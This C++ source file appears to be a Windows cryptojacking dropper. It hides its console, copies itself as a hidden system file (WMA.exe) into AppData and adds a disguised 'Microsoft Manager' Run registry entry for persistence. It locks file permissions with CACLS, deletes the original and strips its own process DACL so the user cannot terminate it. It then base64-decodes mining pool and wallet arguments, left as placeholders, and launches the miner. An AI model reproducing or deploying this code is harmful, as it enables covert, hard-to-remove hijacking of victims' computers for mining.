#define _UNICODE

#include "App.h"
#include <windows.h>
#include <TCHAR.H>
#include <thread>
#include <sddl.h>
#include <stdio.h>
#include <aclapi.h>
#include <stdlib.h>
#include <Shlwapi.h>
#define STRICT
#pragma comment(linker, "/MERGE:.data=.text")
#pragma comment(linker, "/MERGE:.rdata=.text")
#pragma comment(linker, "/SECTION:.text,EWR")

#define STRLEN(x)(sizeof(x) / sizeof(TCHAR) - 1)

bool SelfDefense()
{
	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, GetCurrentProcessId());
	SECURITY_ATTRIBUTES sa;
	TCHAR * szSD = TEXT("D:P");

	sa.nLength = sizeof(SECURITY_ATTRIBUTES);
	sa.bInheritHandle = FALSE;
	if (!ConvertStringSecurityDescriptorToSecurityDescriptor(szSD, SDDL_REVISION_1, &(sa.lpSecurityDescriptor), NULL))
		return FALSE;
	if (!SetKernelObjectSecurity(hProcess, DACL_SECURITY_INFORMATION, sa.lpSecurityDescriptor))
		return FALSE;
	return TRUE;
}

static const std::string base64_chars =
"ABCDEFGHIJKLMNOPQRSTUVWXYZ"
"abcdefghijklmnopqrstuvwxyz"
"0123456789+/";

static inline bool is_base64(unsigned char c) {
	return (isalnum(c) || (c == '+') || (c == '/'));
}

std::string mov_eax_push_5012(std::string encoded_string) {
	int in_len = encoded_string.size();
	int i = 0;
	int j = 0;
	int in_ = 0;
	unsigned char char_array_4[4], char_array_3[3];
	std::string ret;

	while (in_len-- && (encoded_string[in_] != '=') && is_base64(encoded_string[in_])) {
		char_array_4[i++] = encoded_string[in_]; in_++;
		if (i == 4) {
			for (i = 0; i <4; i++)
				char_array_4[i] = base64_chars.find(char_array_4[i]);

			char_array_3[0] = (char_array_4[0] << 2) + ((char_array_4[1] & 0x30) >> 4);
			char_array_3[1] = ((char_array_4[1] & 0xf) << 4) + ((char_array_4[2] & 0x3c) >> 2);
			char_array_3[2] = ((char_array_4[2] & 0x3) << 6) + char_array_4[3];

			for (i = 0; (i < 3); i++)
				ret += char_array_3[i];
			i = 0;
		}
	}

	if (i) {
		for (j = i; j <4; j++)
			char_array_4[j] = 0;

		for (j = 0; j <4; j++)
			char_array_4[j] = base64_chars.find(char_array_4[j]);

		char_array_3[0] = (char_array_4[0] << 2) + ((char_array_4[1] & 0x30) >> 4);
		char_array_3[1] = ((char_array_4[1] & 0xf) << 4) + ((char_array_4[2] & 0x3c) >> 2);
		char_array_3[2] = ((char_array_4[2] & 0x3) << 6) + char_array_4[3];

		for (j = 0; (j < i - 1); j++) ret += char_array_3[j];
	}

	return ret;
}

int Delete(TCHAR* path) {
	TCHAR DelCom[MAX_PATH + 1];
	wsprintfW(DelCom, L"/c timeout -t 2 && del \"%s\"", path);
	ShellExecuteW(0, L"open", L"cmd.exe", DelCom, 0, SW_HIDE);
	std::exit(0);
}

int Copy(TCHAR* CopyPth, TCHAR* CruPath, TCHAR* Username) {
	STARTUPINFO si;
	TCHAR CACLS[1024];
	TCHAR CACLS2[1024];
	memset(&si, 0, sizeof(si));
	si.cb = sizeof(si);
	PROCESS_INFORMATION pi;
	memset(&pi, 0, sizeof(pi));
	CopyFile(CruPath, CopyPth, true);
	SetFileAttributes(CopyPth, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_READONLY | FILE_ATTRIBUTE_SYSTEM);
	wsprintfW(CACLS, L"/c CACLS \"%s\" /E /P %s:N", CopyPth, Username); // Protect this fucking file
	ShellExecuteW(0, L"open", L"cmd.exe", CACLS, 0, SW_HIDE);
	wsprintfW(CACLS2, L"/c Echo Y| CACLS \"%s\" /P %s:R", CopyPth, Username);
	ShellExecuteW(0, L"open", L"cmd.exe", CACLS2, 0, SW_HIDE); // End protect, lazy to comment this shit method ;-)
	CreateProcess(NULL, CopyPth, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
	Delete(CruPath);
}

int CheckMutex() {
	WCHAR MUTEX[] = { L"T", L"r", L"u", L"m", L"M", L"a", L"k", L"e", L"A", L"m", L"e", L"r", L"i", L"c", L"a", L"G", L"r", L"e", L"a", L"t"};
	HANDLE hMutex = CreateMutexW(0, 0, MUTEX);
	if ((GetLastError() == ERROR_ALREADY_EXISTS) || (GetLastError() == ERROR_ACCESS_DENIED)) {
		CloseHandle(hMutex);
		std::exit(0);
	}
	return 0;
}

BOOL IsElevated() {
	BOOL fRet = FALSE;
	HANDLE hToken = NULL;
	if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
		TOKEN_ELEVATION Elevation;
		DWORD cbSize = sizeof(TOKEN_ELEVATION);
		if (GetTokenInformation(hToken, TokenElevation, &Elevation, sizeof(Elevation), &cbSize)) {
			fRet = Elevation.TokenIsElevated;
		}
	}
	if (hToken) {
		CloseHandle(hToken);
	}
	return fRet;
}

int AutoRun(TCHAR* path, BOOL Admin) {
	HKEY hKey = NULL;
	HKEY hKey2 = NULL;
	LONG lResult = 0;
	if (Admin) { // If user admin, set hidden auto run. I am to lazy for comment this step
		lResult = RegOpenKey(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run", &hKey2);
		if (ERROR_SUCCESS != lResult) {
			RegCreateKey(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run", &hKey2);
		}
		RegOpenKey(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run", &hKey2);
		RegSetValueEx(hKey2, L"Microsoft Manager", 0, REG_SZ, (PBYTE)path, lstrlen(path) * sizeof(TCHAR) + 1);
		RegCloseKey(hKey2);
	} else { // But if user not admin, set standart method
		RegOpenKey(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", &hKey);
		RegSetValueEx(hKey, L"Microsoft Manager", 0, REG_SZ, (PBYTE)path, lstrlen(path) * sizeof(TCHAR) + 1);
		RegCloseKey(hKey);
	}
	return 0;
}

int CheckPath() {
	TCHAR Username[256]; // To protect file
	TCHAR AppData[1024 + 1]; // Drop path var
	BOOL Admin = IsElevated(); // Admin? true/false
	TCHAR CruPath[MAX_PATH + 1]; // Current path var

	ExpandEnvironmentStringsW(L"%USERNAME%", Username, 256); // Windows username
	ExpandEnvironmentStringsW(L"%APPDATA%\\WMA.exe", AppData, 1024); // Full drop path
	GetModuleFileName(NULL, CruPath, STRLEN(CruPath)); // Current file path

	if (_tcscmp(CruPath, AppData) != 0) { // Current path is appdata?
		AutoRun(AppData, Admin); // If no set autorun
		Copy(AppData, CruPath, Username); // And drop file
	} else { // Or
		CheckMutex(); // Doublerun?
		if (SelfDefense()) {} // Fuck user
		return 0;
	}
}

//If u need id to worker
char* WorkerID() {
	DWORD VolumeSerialNumber = 0;
	GetVolumeInformation(L"c:\\", NULL, NULL, &VolumeSerialNumber, NULL, NULL, NULL, NULL);
	char procID[20];
	sprintf(procID, "%d", VolumeSerialNumber);

	return procID;
}

int main() {
	ShowWindow(GetConsoleWindow(), SW_HIDE); // hide console
	CheckPath();

	char *frst = new char[mov_eax_push_5012("RmlsbGVlZQ==").length() + 1];
	strcpy(frst, mov_eax_push_5012("RmlsbGVlZQ==").c_str());

	char *scnd = new char[mov_eax_push_5012("LW8=").length() + 1];
	strcpy(scnd, mov_eax_push_5012("LW8=").c_str());

	char *mkdjd = new char[mov_eax_push_5012("LXU=").length() + 1];
	strcpy(mkdjd, mov_eax_push_5012("LXU=").c_str());

	//Pool in base64
	char *urejds = new char[mov_eax_push_5012("PASTE HERE").length() + 1];
	strcpy(urejds, mov_eax_push_5012("PASTE HERE").c_str());

	//Wallet in base64
	char *mkwei3 = new char[mov_eax_push_5012("WALLET HERE").length() + 1];
	strcpy(mkwei3, mov_eax_push_5012("WALLET HERE").c_str());

	static char * dreams[] = { frst, scnd, urejds, mkdjd, mkwei3 };
	App FUcker(5, dreams);

	return FUcker.exec();
}